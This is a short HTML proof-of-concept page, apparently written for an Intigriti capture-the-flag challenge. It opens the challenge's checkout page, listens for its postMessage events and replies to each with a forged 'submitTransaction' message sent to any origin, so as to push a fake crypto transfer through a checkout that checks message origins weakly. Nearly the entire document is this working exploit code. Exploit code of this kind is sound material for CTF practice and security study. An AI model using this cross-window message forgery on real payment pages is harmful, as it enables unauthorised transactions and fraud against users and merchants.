<!DOCTYPE html>
<html>
<body>
<script>
// This simulates what happens when the payment gateway sends a message
window.addEventListener('message', (event) => {
    console.log('Received:', event.data);
    // Echo back with different data
    event.source.postMessage({
        type: 'submitTransaction',
        transaction: {
            toAddress: '10970063d33e32396bb80753a2b902d568', // Try different addresses
            currency: '1337COIN',
            amount: 1337 // Common CTF number
        }
    }, '*');
});

// Open the checkout page
window.open('https://challenge-0126.intigriti.io/checkout.html');
</script>
</body>
</html>
